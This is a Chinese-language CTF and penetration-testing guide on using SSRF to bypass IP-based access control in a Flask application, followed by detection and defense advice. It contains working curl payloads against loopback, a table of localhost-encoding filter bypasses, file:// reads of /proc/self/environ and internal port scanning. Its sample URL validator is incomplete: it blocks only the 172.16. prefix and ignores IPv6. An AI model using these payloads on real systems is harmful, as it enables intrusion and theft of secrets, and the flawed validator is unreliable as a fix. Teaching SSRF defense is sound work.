# SSRF 绕过 IP 基础认证攻击

## 1. 概述

### 1.1 攻击原理

当应用程序使用 IP 地址（如 `request.remote_addr == '127.0.0.1'`）作为唯一的访问控制机制，同时存在 SSRF 漏洞允许用户控制 URL 发起请求时，攻击者可以通过 SSRF 漏洞使服务器向自身发起请求，从而绕过 IP 基础认证。

### 1.2 攻击条件

- 应用存在 SSRF 漏洞（用户可控 URL 参数直接传递给 HTTP 客户端）
- 应用使用 IP 地址进行访问控制（如限制仅允许 127.0.0.1 访问）
- SSRF 端点无 URL 验证（无 allowlist/blocklist）

### 1.3 攻击影响

- **垂直权限提升**：从匿名用户提升至管理员权限
- **敏感数据泄露**：访问受保护的管理端点获取敏感信息
- **信任边界崩溃**：网络层访问控制完全失效

---

## 2. 攻击场景

### 2.1 Flask 应用 IP 基础认证绕过

**目标环境：**
- Flask 应用使用 `request.remote_addr` 进行 IP 检查
- 管理端点限制仅允许 127.0.0.1 访问
- 存在 SSRF 端点接受用户可控 URL

**脆弱代码示例：**
```python
# 管理端点 - IP 基础认证
@app.route('/admin/flag')
def admin_flag():
    if request.remote_addr != '127.0.0.1':
        abort(403)
    return render_template('flag.html', flag=FLAG)

# SSRF 端点 - 无 URL 验证
@app.route('/convert', methods=['POST'])
def convert():
    url = request.form.get('url')
    response = urllib.request.urlopen(url)  # 无验证！
    return response.read()
```

**攻击步骤：**

1. **识别 SSRF 端点**
   ```bash
   # 发现 /convert 端点接受 url 参数
   curl -X POST http://target/convert -d "url=http://example.com"
   ```

2. **验证 IP 认证保护**
   ```bash
   # 直接访问管理端点被拒绝
   curl http://target/admin/flag
   # 响应：HTTP 403 Forbidden
   ```

3. **构造 SSRF Payload**
   ```bash
   # 通过 SSRF 使服务器向自身发起请求
   curl -X POST http://target/convert \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "url=http://127.0.0.1/admin/flag"
   ```

4. **获取敏感数据**
   ```html
   <!-- 响应包含 Flag -->
   <p>Your flag is: flag{cbf59a8d-b5f1-4a8e-8286-0c249b14d682}</p>
   ```

**攻击流程图：**
```
外部攻击者
    ↓ [POST /convert?url=http://127.0.0.1/admin/flag]
Flask 应用 (SSRF 端点)
    ↓ [urllib.request.urlopen("http://127.0.0.1/admin/flag")]
内部请求 (127.0.0.1 → 127.0.0.1)
    ↓ [request.remote_addr == '127.0.0.1' 检查通过]
管理端点返回敏感数据
    ↓ [HTML 响应]
攻击者获取 Flag
```

### 2.2 替代 Localhost 表示法

攻击者可使用多种 localhost 表示法绕过简单字符串匹配：

| 表示法 | Payload 示例 | 说明 |
|--------|-------------|------|
| 标准 IPv4 | `http://127.0.0.1/admin` | 最常见 |
| 主机名 | `http://localhost/admin` | DNS 解析为 127.0.0.1 |
| IPv6 | `http://[::1]/admin` | IPv6 环回地址 |
| 省略形式 | `http://127.1/admin` | 部分系统支持 |
| 八进制 | `http://0177.0.0.1/admin` | 八进制表示 |
| 十六进制 | `http://0x7f.0.0.1/admin` | 十六进制表示 |
| 十进制 | `http://2130706433/admin` | 32 位整数表示 |
| 0.0.0.0 | `http://0.0.0.0/admin` | 绑定所有接口 |

---

## 3. 攻击扩展

### 3.1 访问其他内部端点

**扫描管理接口：**
```bash
# 访问管理面板
curl -X POST http://target/convert -d "url=http://127.0.0.1/admin"

# 访问 API 端点
curl -X POST http://target/convert -d "url=http://127.0.0.1/api/v1/users"

# 访问健康检查端点
curl -X POST http://target/convert -d "url=http://127.0.0.1/health"
```

### 3.2 结合文件读取

**读取应用源码：**
```bash
# 读取 Flask 应用源码获取敏感信息
curl -X POST http://target/convert -d "url=file:///app/app.py"
```

**读取环境变量：**
```bash
# 读取容器环境变量（可能包含密钥）
curl -X POST http://target/convert -d "url=file:///proc/self/environ"
```

### 3.3 内网横向移动

**扫描内网服务：**
```bash
# 扫描常见内部服务端口
for port in 80 443 3306 5432 6379 27017; do
    curl -X POST http://target/convert \
      -d "url=http://192.168.1.100:${port}/" \
      --max-time 2
done
```

---

## 4. 检测与防御

### 4.1 检测方法

**代码审计：**
- 搜索 `request.remote_addr` 用于访问控制
- 搜索 `urllib.request.urlopen()`、`requests.get()` 等 HTTP 客户端调用
- 检查 URL 参数是否有验证逻辑

**渗透测试：**
- 尝试访问 `http://127.0.0.1/` 通过 SSRF 端点
- 测试 file://协议是否可用
- 检查响应中是否包含内部服务信息

### 4.2 防御措施

**立即修复：**
1. **实施 URL 验证**
   ```python
   from urllib.parse import urlparse
   import socket
   
   def is_safe_url(url):
       parsed = urlparse(url)
       if parsed.scheme not in ['http', 'https']:
           return False
       
       # 解析域名获取 IP
       ip = socket.gethostbyname(parsed.hostname)
       
       # 检查是否为私有 IP
       if ip.startswith('127.') or ip.startswith('10.') or \
          ip.startswith('192.168.') or ip.startswith('172.16.'):
           return False
       
       # 检查云元数据 IP
       if ip.startswith('169.254.'):
           return False
       
       return True
   ```

2. **替换 IP 基础认证**
   ```python
   # 使用基于会话的认证
   from flask_login import login_required, current_user
   
   @app.route('/admin/flag')
   @login_required
   def admin_flag():
       if not current_user.is_admin:
           abort(403)
       return render_template('flag.html', flag=FLAG)
   ```

3. **实施纵深防御**
   - 添加 API 令牌验证
   - 实施基于角色的访问控制（RBAC）
   - 添加请求签名验证

**长期改进：**
- 使用服务网格进行网络层访问控制
- 实施零信任架构
- 添加 SSRF 检测监控

---

## 5. 参考资源

- [OWASP SSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [CVE-2021-41773 Apache Path Traversal](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## 6. 攻击案例总结

| 案例 | 攻击向量 | 影响 | 修复建议 |
|------|---------|------|---------|
| Flask Markdown 转换器 | SSRF + IP 认证绕过 | Flag 泄露 | URL 验证 + 会话认证 |
| 云环境元数据访问 | SSRF + 169.254.169.254 | IAM 凭证泄露 | 元数据 IP 封锁 + IMDSv2 |
| 内网数据库访问 | SSRF + 端口扫描 | 数据库沦陷 | 网络分段 + 防火墙规则 |

---

**文档版本：** 1.0  
**最后更新：** 2026 年 3 月  
**适用场景：** CTF 挑战、渗透测试、安全审计
